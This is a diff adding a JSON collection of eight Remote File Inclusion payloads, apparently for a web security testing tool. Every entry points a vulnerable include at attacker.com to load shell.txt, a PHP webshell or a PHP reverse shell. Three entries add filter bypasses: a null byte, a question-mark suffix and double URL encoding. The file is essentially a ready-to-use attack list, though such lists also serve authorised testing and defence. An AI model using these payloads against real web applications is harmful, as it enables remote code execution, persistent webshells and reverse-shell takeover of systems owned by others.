@@ -1,0 +1,155 @@
+{
+    "category": "RFI",
+    "description": "Remote File Inclusion payloads for including external malicious files",
+    "payloads": [
+        {
+            "id": "rfi-basic-001",
+            "title": "HTTP Include",
+            "payload": "http://attacker.com/shell.txt",
+            "category": "RFI",
+            "subcategory": "Basic",
+            "context": [
+                "url",
+                "file"
+            ],
+            "level": "high",
+            "tags": [
+                "basic",
+                "http",
+                "shell"
+            ],
+            "notes": "Basic HTTP remote include",
+            "source": "github"
+        },
+        {
+            "id": "rfi-basic-002",
+            "title": "HTTPS Include",
+            "payload": "https://attacker.com/shell.txt",
+            "category": "RFI",
+            "subcategory": "Basic",
+            "context": [
+                "url",
+                "file"
+            ],
+            "level": "high",
+            "tags": [
+                "basic",
+                "https",
+                "shell"
+            ],
+            "notes": "HTTPS remote include",
+            "source": "github"
+        },
+        {
+            "id": "rfi-basic-003",
+            "title": "FTP Include",
+            "payload": "ftp://attacker.com/shell.txt",
+            "category": "RFI",
+            "subcategory": "Basic",
+            "context": [
+                "url",
+                "file"
+            ],
+            "level": "high",
+            "tags": [
+                "basic",
+                "ftp",
+                "shell"
+            ],
+            "notes": "FTP protocol include",
+            "source": "github"
+        },
+        {
+            "id": "rfi-bypass-001",
+            "title": "Null Byte Suffix",
+            "payload": "http://attacker.com/shell.txt%00",
+            "category": "RFI",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "high",
+            "tags": [
+                "bypass",
+                "null",
+                "suffix"
+            ],
+            "notes": "Null byte to bypass extension check",
+            "source": "github"
+        },
+        {
+            "id": "rfi-bypass-002",
+            "title": "Question Mark Suffix",
+            "payload": "http://attacker.com/shell.txt?",
+            "category": "RFI",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "query",
+                "suffix"
+            ],
+            "notes": "Query string to bypass extension",
+            "source": "github"
+        },
+        {
+            "id": "rfi-bypass-003",
+            "title": "Double Encoding",
+            "payload": "http%253A%252F%252Fattacker.com%252Fshell.txt",
+            "category": "RFI",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "high",
+            "tags": [
+                "bypass",
+                "encoding",
+                "double"
+            ],
+            "notes": "Double URL encoding bypass",
+            "source": "github"
+        },
+        {
+            "id": "rfi-php-001",
+            "title": "PHP Webshell",
+            "payload": "http://attacker.com/shell.php",
+            "category": "RFI",
+            "subcategory": "PHP Shell",
+            "context": [
+                "url",
+                "php"
+            ],
+            "level": "high",
+            "tags": [
+                "php",
+                "webshell",
+                "rce"
+            ],
+            "notes": "Include remote PHP webshell",
+            "source": "github"
+        },
+        {
+            "id": "rfi-php-002",
+            "title": "PHP Reverse Shell",
+            "payload": "http://attacker.com/reverse.php",
+            "category": "RFI",
+            "subcategory": "PHP Shell",
+            "context": [
+                "url",
+                "php"
+            ],
+            "level": "high",
+            "tags": [
+                "php",
+                "reverse",
+                "shell"
+            ],
+            "notes": "Include PHP reverse shell",
+            "source": "github"
+        }
+    ]
+}
